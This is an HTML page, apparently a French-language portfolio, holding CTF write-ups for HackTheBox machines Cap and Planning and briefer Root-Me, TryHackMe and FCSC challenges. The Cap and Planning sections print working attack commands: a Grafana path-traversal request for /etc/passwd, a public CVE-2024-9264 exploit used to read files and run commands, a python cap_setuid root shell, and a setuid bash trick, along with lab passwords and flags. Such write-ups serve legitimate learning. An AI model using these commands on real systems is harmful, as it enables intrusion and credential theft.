<!DOCTYPE html>
<html lang="fr">
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width,initial-scale=1" />
  <title>Fr3nch4Sec - Writeups CTF</title>

  <!-- Marked.js -->
  <script src="https://cdn.jsdelivr.net/npm/marked/marked.min.js"></script>

  <!-- Highlight.js -->
  <link id="highlight-theme" rel="stylesheet"
        href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/styles/github-dark.min.css">
  <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/highlight.min.js"></script>

  <!-- Inline CSS (tout le style est embarqu√© pour avoir un seul fichier) -->
  <style>
    :root{
      --bg-dark: #0d1117;
      --text-dark: #e6edf3;
      --accent-dark: #58a6ff;
      --code-bg-dark: #161b22;
      --code-green: #00ff7f;

      --bg-light: #f6f8fa;
      --text-light: #24292f;
      --accent-light: #d81b60;
      --code-bg-light: #f5f5f5;
      --code-blue: #005cc5;
    }

    /* page layout */
    html,body{height:100%;margin:0;padding:0;font-family:Inter, Arial, sans-serif;}
    body{background:var(--bg-dark);color:var(--text-dark);padding:28px;transition:background .25s,color .25s;}
    main{max-width:1100px;margin:0 auto;}

    header h1{margin:0 0 6px;font-size:2rem;}
    header p{margin:0 0 18px;color:rgba(230,237,243,0.85);}

    /* theme toggle button */
    .theme-toggle{
      position:fixed;right:18px;top:18px;padding:8px 12px;border-radius:8px;border:0;cursor:pointer;
      background:#1e90ff;color:#fff;font-weight:700;box-shadow:0 4px 12px rgba(0,0,0,0.25);
    }

    /* sections / cards */
    .platform-section{margin-bottom:28px;padding:16px;border-radius:10px;background:rgba(30,30,30,0.85);}
    .platform-section h2{margin:0 0 12px;color:var(--accent-dark);}

    .writeup-item{margin:12px 0;padding:12px;border-radius:8px;background:rgba(50,50,50,0.55);position:relative;}
    .writeup-item h3{margin:0;font-size:1.05rem;}
    .clickable{cursor:pointer;display:flex;align-items:center;justify-content:space-between;gap:10px;padding-right:28px;}
    .clickable span.title-text{flex:1}
    .clickable::after{content:'+';font-size:1.2rem;font-weight:700;position:absolute;right:16px;top:14px;transition:transform .2s}
    .clickable.open::after{content:'‚àí';transform:rotate(180deg)}

    /* accordion content */
    .writeup-content{max-height:0;overflow:hidden;padding:0 8px;transition:max-height .45s ease,padding .25s;}
    .writeup-content.open{padding:12px 8px;margin-top:8px;max-height:2000px;overflow:visible}

    /* markdown content styling */
    .writeup-content h1,.writeup-content h2,.writeup-content h3{color:var(--accent-dark);margin-top:8px}
    .writeup-content p{margin:8px 0;color:inherit}
    .writeup-content ul{margin:8px 0 8px 20px}
    .writeup-content pre{background:var(--code-bg-dark);color:var(--code-green);padding:12px;border-radius:6px;overflow:auto;margin:10px 0;white-space:pre-wrap;font-family: "Hack", monospace;font-size:0.95rem}
    .writeup-content code{background:rgba(0,0,0,0.2);padding:2px 6px;border-radius:4px}

    /* tables (make them non-intrusive) */
    .writeup-content table{width:100%;table-layout:auto;border-collapse:collapse;margin:10px 0}
    .writeup-content th,.writeup-content td{padding:6px 8px;text-align:left;border-bottom:1px solid rgba(255,255,255,0.03);word-break:break-word}

    /* images responsive */
    .writeup-content img{max-width:100%;height:auto;border-radius:6px;margin:10px 0;display:block}

    /* light mode overrides */
    body.light-mode{
      background:var(--bg-light);
      color:var(--text-light);
    }
    body.light-mode .platform-section{background:#fff;border:1px solid #e6e6e6}
    body.light-mode .writeup-item{background:#fafafa;border:1px solid #e8e8e8}
    body.light-mode .platform-section h2{color:var(--accent-light)}
    body.light-mode .clickable::after{color:#333}
    body.light-mode .writeup-content pre{background:var(--code-bg-light);color:var(--code-blue)}

    /* small screens */
    @media (max-width:700px){
      body{padding:18px}
      .theme-toggle{right:12px;top:12px;padding:6px 10px}
      header h1{font-size:1.5rem}
    }
  </style>
</head>
<body class="dark-mode">
  <!-- Theme toggle -->
  <button id="theme-toggle" class="theme-toggle" aria-label="Basculer th√®me"><span class="theme-icon">üåô</span></button>

  <main>
    <header>
      <h1>üìÇ Writeups CTF</h1>
      <p>Voici mes writeups organis√©s par plateforme :</p>
    </header>

    <div id="writeupList">

      <!-- Hack The Box -->
      <section class="platform-section">
        <h2>Hack The Box</h2>

        <!-- Cap Machine -->
        <article class="writeup-item">
          <h3 class="clickable"><span class="title-text">Cap Machine - Easy</span></h3>
          <div class="writeup-content" aria-hidden="true">
            <script type="text/markdown">
# HackTheBox - Cap Machine - Easy

1. **Reconnaissance**

### Scan des ports
Le Firewall de la machine bloque les scans basiques, avec transaction 'SynAck' compl√®te.  
J'utilise Naabu en premier avec Nmap sur chaque machine, car c'est super rapide.  
Donc, j'ai utilis√© le flag `-sS` dans Nmap, pour initier la connexion avec l'envoi de paquets. Si Nmap re√ßoit la r√©ponse, le port est consid√©r√© comme ouvert.

```bash
sudo naabu -host 10.10.10.245 -nmap-cli 'nmap -sS -sV -A -Pn -v'

R√©sultats (exemple format√© en code)

PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2
80/tcp open  http    gunicorn

Fuzzing de l'url avec Ffuf et Gobuster:

ffuf -c -u http://10.10.10.245/FUZZ -w /home/french/documents/seclists/discovery/web-content/directory-list-2.3-medium.txt -recursion-depth 1

ffuf -c -u http://10.10.10.245/FUZZ -w /home/french/documents/seclists/discovery/dns/subdomains-top1million-5000.txt

R√©sultats obtenus :

/ip
/netstat
/data

Apr√®s avoir t√©l√©charg√© un PCAP sur /data/0 et analys√© avec Wireshark, j'ai trouv√© des identifiants en clair dans les √©changes FTP.

    Exploitation

Connexion SSH

ssh nathan@10.10.10.245

Extrait de session :

nathan@cap:~$ ls
e.py  linpeas  linpeas.sh  snap  user.txt
nathan@cap:~$ cat user.txt
d2ee7e0a3b896efed8eeeeab2aeb1ff6

J'ai lanc√© linpeas et observ√© que /usr/bin/python3.8 poss√©dait cap_setuid :

/usr/bin/python3.8 = cap_setuid,cap_net_bind_service+eip

    Acc√®s root

Escalade via Python cap_setuid :

/usr/bin/python3.8 -c 'import os; os.setuid(0); os.system("/bin/bash")'

Extrait root :

root@cap:/root# cat root.txt
b17a06939691f0e4f924f37138c32eeb

Conclusion

Une excellente machine pour apprendre les bases de l'√©num√©ration et de l'exploitation simple.
</script>
</div>
</article>

    <!-- Planning HTB (le writeup que tu as ajout√©) -->
    <article class="writeup-item">
      <h3 class="clickable"><span class="title-text">Planning HTB</span></h3>
      <div class="writeup-content" aria-hidden="true">
        <script type="text/markdown">

HTB - Planning

Write-up

L‚Äôintitul√© du CTF fournit des identifiants pour commencer.

id: admin
pwd: 0D5oT70Fq13EvB5r
Reconnaissance

nmap -p- -sC -sV -O 10.10.11.68

Extrait :

22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.11 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    nginx 1.24.0 (Ubuntu)

Scan des vuln√©rabilit√©s

nuclei -target http://planning.htb

(quelques lignes de sortie : tech d√©tect, headers manquants, etc.)
Fuzzing

ffuf -c -w namelist.txt -H 'Host: FUZZ.planning.htb' -u http://10.10.11.68 -fc 301

R√©sultat notable : grafana (302)

Tester LFI sur Grafana :

curl --path-as-is -i "http://grafana.planning.htb/public/build/datasource/../../../../../../../../etc/passwd"

R√©cup√©ration de la version Grafana :

curl -s "http://grafana.planning.htb/login" | grep -i version
# "version":"11.0.0" ...

Exploitation

Un exploit public pour CVE-2024-9264 est disponible : https://github.com/nollium/CVE-2024-9264

Lancer l'exploit (exemple) :

python3 CVE-2024-9264.py -u admin -p 0D5oT70Fq13EvB5r -f /etc/passwd http://grafana.planning.htb:80

Lecture de /etc/passwd r√©ussie. Ensuite, tentative d'ex√©cution de commandes et exfiltration :

python3 CVE-2024-9264.py -u admin -p 0D5oT70Fq13EvB5r -c "cat /home/grafana/user.txt" http://grafana.planning.htb

Tentatives pour r√©cup√©rer flags dans /home/grafana ont √©chou√© (fichiers inexistants), mais lecture de /proc/1/environ et ex√©cution de commandes permis :

python3 CVE-2024-9264.py -u admin -p 0D5oT70Fq13EvB5r -f /proc/1/environ http://grafana.planning.htb

Exemple : lecture d'environnement contenant GF_SECURITY_ADMIN_PASSWORD=RioTecRANDEntANT! (mot de passe potentiellement utile).
Post-exploitation & pivot

SSH enzo@10.10.11.68 avec le mot de passe trouv√©, exploration, d√©couverte d'un service local sur le port 8000 (UI crontab), et d√©couverte de mots de passe dans /opt/crontabs/crontab.db (ex : P4ssw0rdS0pRi0T3c).

Utilisation d'un tunnel SSH pour acc√©der √† l'UI crontab via navigateur local :

ssh -L 8000:127.0.0.1:8000 -N -f enzo@planning.htb
# puis ouvrir http://127.0.0.1:8000 dans le navigateur

Cr√©ation d'un cronjob qui sauvegarde l'image docker grafana et la zippe (extrait du crontab). Ajout d'un cron qui cr√©e un bash setuid dans /tmp permettant d'obtenir root :

cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash
# ensuite /tmp/rootbash -p pour obtenir shell root

Flags trouv√©s :

user.txt: c2eccb774042d4ac3ff83c3c66b55250
root.txt: b7f38a74e151fbff1dc3a481ca59db70

Conclusion

Box int√©ressante pour manipuler Grafana, Docker et crontabs. La partie tunnel SSH pour acc√©der √† l'UI crontab a √©t√© instructive.
</script>
</div>
</article>

    <!-- Machine Basique -->
    <article class="writeup-item">
      <h3 class="clickable"><span class="title-text">Machine Basique</span></h3>
      <div class="writeup-content" aria-hidden="true">
        <script type="text/markdown">

HackTheBox - Machine Basique
Introduction

Ce writeup d√©crit la r√©solution de la machine "Basique" sur HackTheBox. L'objectif √©tait de d√©couvrir les services expos√©s et d'exploiter une faille simple.
√âtapes

    Scan initial : Utilisation de nmap pour identifier les ports ouverts.

nmap -sC -sV -oA scan 10.10.10.10

    Exploitation : D√©couverte d'une vuln√©rabilit√© dans un service web.

    Acc√®s root : Escalade de privil√®ges via un fichier de configuration mal s√©curis√©.

Conclusion

Cette machine √©tait un excellent exercice pour les d√©butants en pentest.
</script>
</div>
</article>

  </section> <!-- end HTB -->

  <!-- TryHackMe -->
  <section class="platform-section">
    <h2>TryHackMe</h2>

    <article class="writeup-item">
      <h3 class="clickable"><span class="title-text">Machine Easy & Medium</span></h3>
      <div class="writeup-content" aria-hidden="true">
        <script type="text/markdown">

TryHackMe - Machine Easy & Medium
Introduction

Ce writeup couvre une machine TryHackMe combinant des √©l√©ments faciles et moyens, avec un focus sur l'√©num√©ration et l'exploitation web.
√âtapes

    √ânum√©ration : Scan des ports et services.

nmap -sV -sC 10.10.10.10

    Exploitation : Vuln√©rabilit√© dans un CMS mal configur√©.

    Post-exploitation : Recherche de flags et escalade de privil√®ges.

Conclusion

Un bon challenge pour consolider les bases du pentest.
</script>
</div>
</article>

  </section>

  <!-- Root-Me -->
  <section class="platform-section">
    <h2>Root-Me</h2>

    <article class="writeup-item">
      <h3 class="clickable"><span class="title-text">Challenge Forensic</span></h3>
      <div class="writeup-content" aria-hidden="true">
        <script type="text/markdown">

Root-Me - Challenge Forensic
Introduction

Ce challenge portait sur l'analyse d'une image m√©moire avec Volatility pour extraire des informations sensibles.
√âtapes

    Analyse m√©moire : Utilisation de Volatility pour lister les processus.

volatility -f memory.dump pslist

    Extraction : R√©cup√©ration d'un mot de passe dans un dump m√©moire.

    Validation : Soumission du flag obtenu.

Conclusion

Une bonne introduction √† l'analyse forensique avec Volatility.
</script>
</div>
</article>
</section>

  <!-- FCSC -->
  <section class="platform-section">
    <h2>FCSC</h2>

    <article class="writeup-item">
      <h3 class="clickable"><span class="title-text">Cryptobro</span></h3>
      <div class="writeup-content" aria-hidden="true">
        <script type="text/markdown">

FCSC 2025 - Cryptobro
Introduction

Ce challenge combinait cryptographie et analyse forensique, avec un fichier .npy √† analyser.
√âtapes

    Analyse du fichier : Utilisation de NumPy pour charger le fichier .npy.

import numpy as np
data = np.load('challenge.npy')

    D√©codage : Identification d'un message chiffr√© dans les donn√©es.

    D√©cryptage : Application d'une m√©thode de d√©chiffrement pour extraire le flag.

Conclusion

Un challenge int√©ressant qui m√™le plusieurs disciplines.
</script>
</div>
</article>
</section>

</div> <!-- end writeupList -->

<p style="margin-top:18px"><a href="index.html" style="color:inherit;font-weight:700;text-decoration:none">‚¨Ö Retour au portfolio</a></p>

</main> <!-- JavaScript: parsing Markdown + accordion + theme + highlight.js --> <script> // Configure marked to use highlight.js marked.setOptions({ highlight: function(code, lang) { try { if (lang && hljs.getLanguage(lang)) { return hljs.highlight(code, { language: lang }).value; } else { return hljs.highlightAuto(code).value; } } catch (e) { return code; } } }); // After DOM ready: parse markdown and setup accordion behavior document.addEventListener('DOMContentLoaded', () => { // Parse all markdown blocks into their writeup-content container document.querySelectorAll('.writeup-content').forEach(contentDiv => { const mdScript = contentDiv.querySelector('script[type="text/markdown"]'); if (mdScript) { // Use marked to produce HTML contentDiv.innerHTML = marked.parse(mdScript.textContent); // Apply highlight.js on initial parse (will color code blocks) hljs.highlightAll(); } }); // Accordion toggle: open one at a time document.querySelectorAll('.writeup-item').forEach(item => { const title = item.querySelector('.clickable'); const content = item.querySelector('.writeup-content'); if (!title || !content) return; title.addEventListener('click', () => { const isOpen = content.classList.contains('open'); // Close other open ones document.querySelectorAll('.writeup-content.open').forEach(other => { if (other !== content) { other.classList.remove('open'); const otherTitle = other.parentElement.querySelector('.clickable'); if (otherTitle) otherTitle.classList.remove('open'); } }); // Toggle current content.classList.toggle('open', !isOpen); title.classList.toggle('open', !isOpen); // Ensure highlight after opening (in case styles/themes changed) if (!isOpen) { setTimeout(() => hljs.highlightAll(), 120); } }); }); // Theme init (dark by default unless localStorage says otherwise) const toggle = document.getElementById('theme-toggle'); const icon = toggle.querySelector('.theme-icon'); const hlTheme = document.getElementById('highlight-theme'); function applyTheme(isDark) { if (isDark) { document.body.classList.remove('light-mode'); document.body.classList.add('dark-mode'); icon.textContent = '‚òÄÔ∏è'; hlTheme.href = 'https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/styles/github-dark.min.css'; } else { document.body.classList.remove('dark-mode'); document.body.classList.add('light-mode'); icon.textContent = 'üåô'; hlTheme.href = 'https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/styles/github.min.css'; } // re-highlight after theme change setTimeout(() => hljs.highlightAll(), 160); } const saved = localStorage.getItem('theme'); const isDarkSaved = saved === 'dark' || saved === null; // default dark applyTheme(isDarkSaved); toggle.addEventListener('click', () => { const nowDark = document.body.classList.contains('dark-mode'); applyTheme(!nowDark); localStorage.setItem('theme', !nowDark ? 'dark' : 'light'); }); }); </script> </body> </html> ```
